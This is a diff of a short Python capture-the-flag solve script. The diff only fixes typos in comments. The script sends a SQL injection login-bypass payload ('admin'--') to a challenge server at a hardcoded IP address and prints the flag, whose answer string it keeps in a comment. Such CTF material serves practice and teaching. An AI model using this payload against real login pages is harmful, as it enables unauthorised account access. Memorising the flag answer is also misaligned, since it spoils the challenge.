@@ -1,14 +1,14 @@
 import requests
 import re
 """
-    in this challenge we had a simple login page ever the 'fogot password' feature isn't implemented
-    so the first thing to test is ofc SQL injection
+    in this challenge we had a simple login page even the 'forgot password' feature isn't implemented
+    so the first thing to test is of course SQL injection
 
 """
 
 base_url="http://68.219.177.187:8004/login"
 
-# the query is at most likely : SELECT * FROM users WHERE username=user AND password=pass; (where user and passs are the inputs)
+# the query is most likely: SELECT * FROM users WHERE username=user AND password=pass; (where user and pass are the inputs)
 
 data={
     "username": "admin'--",
@@ -26,5 +26,4 @@ if flag_match:
 else:
     print("[-] Flag not found in response")
     
-    
-#The flag:SecurinetsEnit{b5a1cfc34b9f1b0a5c8e6a7c3b9d1e2a}
+#The flag: SecurinetsEnit{b5a1cfc34b9f1b0a5c8e6a7c3b9d1e2a}
